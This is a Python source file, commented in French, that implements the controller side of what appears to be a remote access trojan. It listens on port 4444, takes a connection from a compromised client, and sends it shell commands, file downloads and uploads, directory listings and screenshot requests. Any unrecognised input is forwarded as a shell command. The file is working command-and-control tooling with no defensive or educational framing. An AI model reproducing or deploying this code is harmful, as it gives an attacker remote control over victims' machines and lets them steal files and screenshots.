import socket  
import json  
import base64  
import os  
  
HOST = '0.0.0.0'  # Écoute sur toutes les interfaces disponibles  
PORT = 4444  
BUFFER_SIZE = 4096  
  
def reliable_send(sock, data):  
    """Envoie des données de manière fiable, en préfixant la taille."""  
    json_data = json.dumps(data)  
    sock.sendall(str(len(json_data)).encode().ljust(16) + json_data.encode())  
  
def reliable_recv(sock):  
    """Reçoit des données de manière fiable, en lisant la taille d'abord."""  
    try:  
        size_raw = sock.recv(16)  
        if not size_raw:  
            return None  
        size = int(size_raw.strip())  
        data = b''  
        while len(data) < size:  
            packet = sock.recv(size - len(data))  
            if not packet:  
                return None  
            data += packet  
        return json.loads(data.decode())  
    except Exception as e:  
        print(f"Error in reliable_recv: {e}")  
        return None  
  
def server_main():  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    s.bind((HOST, PORT))  
    s.listen(1)  
    print(f"[*] Listening on {HOST}:{PORT}")  
  
    conn, addr = s.accept()  
    print(f"[*] Connection from {addr[0]}:{addr[1]}")  
  
    try:  
        while True:  
            command_input = input(f"{os.getcwd()}> ") # Afficher le CWD simulé  
  
            if not command_input.strip():  
                continue  
  
            parts = command_input.split(" ", 1)  
            command = parts[0]  
            args = parts[1] if len(parts) > 1 else ""  
  
            if command == "exit":  
                reliable_send(conn, {"command": "exit"})  
                response = reliable_recv(conn)  
                print(response.get("data", "No response from client."))  
                break  
            elif command == "cd":  
                reliable_send(conn, {"command": "cd", "path": args})  
                response = reliable_recv(conn)  
                print(response.get("data", "No response."))  
                # Mettre à jour le CWD côté client pour l'affichage du prompt  
                # C'est une simulation, le serveur ne connaît pas réellement le CWD du client.  
                # Pour un suivi précis, le client devrait renvoyer son CWD.  
                # Supposons que le client renvoie le nouveau CWD.  
                if response and "cwd" in response:  
                    os.chdir(response["cwd"]) # Changer le répertoire local du serveur pour simuler  
  
            elif command == "download":  
                if not args:  
                    print("Usage: download <remote_file_path>")  
                    continue  
                reliable_send(conn, {"command": "download", "path": args})  
                response = reliable_recv(conn) # Attend le type de réponse 'file_data'  
                if response and response.get("status") == "file_data":  
                    filename = response.get("filename", "downloaded_file")  
                    file_content_base64 = response.get("data")  
                    try:  
                        file_content = base64.b64decode(file_content_base64)  
                        with open(filename, "wb") as f:  
                            f.write(file_content)  
                        print(f"File '{filename}' downloaded successfully.")  
                    except Exception as e:  
                        print(f"Error decoding or writing file: {e}")  
                else:  
                    print(response.get("data", "Download failed or client error."))  
  
            elif command == "upload":  
                if not args:  
                    print("Usage: upload <local_file_path> <remote_target_path>")  
                    continue  
                local_path, remote_path = args.split(" ", 1)  
                try:  
                    with open(local_path, "rb") as f:  
                        file_content_base64 = base64.b64encode(f.read()).decode('utf-8')  
                    reliable_send(conn, {"command": "upload", "path": remote_path, "content": file_content_base64})  
                    response = reliable_recv(conn)  
                    print(response.get("data", "Upload failed or client error."))  
                except FileNotFoundError:  
                    print(f"Error: Local file '{local_path}' not found.")  
                except Exception as e:  
                    print(f"Error during upload: {e}")  
  
            elif command == "ls": # Simplifie ls pour utiliser 'args' comme chemin  
                reliable_send(conn, {"command": "ls", "path": args if args else "."})  
                response = reliable_recv(conn)  
                print(response.get("data", "No response."))  
  
            elif command == "shell":  
                reliable_send(conn, {"command": "shell", "args": args})  
                response = reliable_recv(conn)  
                print(response.get("data", "No response."))  
  
            elif command == "screenshot":  
                reliable_send(conn, {"command": "screenshot"})  
                response = reliable_recv(conn)  
                print(response.get("data", "No response."))  
  
            else:  
                print(f"Unknown server command: {command}")  
                # Envoyer comme une commande shell si ce n'est pas un commande interne du serveur  
                reliable_send(conn, {"command": "shell", "args": command_input})  
                response = reliable_recv(conn)  
                print(response.get("data", "No response."))  
  
    except KeyboardInterrupt:  
        print("\n[*] Server exiting.")  
    finally:  
        conn.close()  
        s.close()  
  
if __name__ == "__main__":  
    server_main()
